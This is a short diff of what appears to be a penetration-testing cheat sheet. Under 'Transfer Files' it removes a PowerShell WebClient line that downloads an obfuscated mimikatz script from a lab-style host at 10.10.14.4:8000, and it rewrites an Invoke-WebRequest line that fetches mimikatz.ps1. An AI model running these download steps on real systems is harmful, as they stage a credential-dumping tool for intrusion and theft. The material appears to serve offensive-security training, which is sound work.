@@ -23,10 +23,8 @@ powershell -c "[Environment]::Is64BitProcess"
 
 ##### Transfer Files
 ```powershell
-(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.4:8000/file.ps1", "C:\users\public\downloads\obf-mimikatz.ps1")
-
 ## -UseBasicParsing parameter stops explorer from opening the browser.
-Invoke-Webrequest -UseBasicParsing 10.10.14.4:8000/mimikatz.ps1 -OutFile filename.ps1
+Invoke-Webrequest -UseBasicParsing 0.0.0.0:8000/mimikatz.ps1 -OutFile filename.ps1
 ```
 
 ##### Antivirus
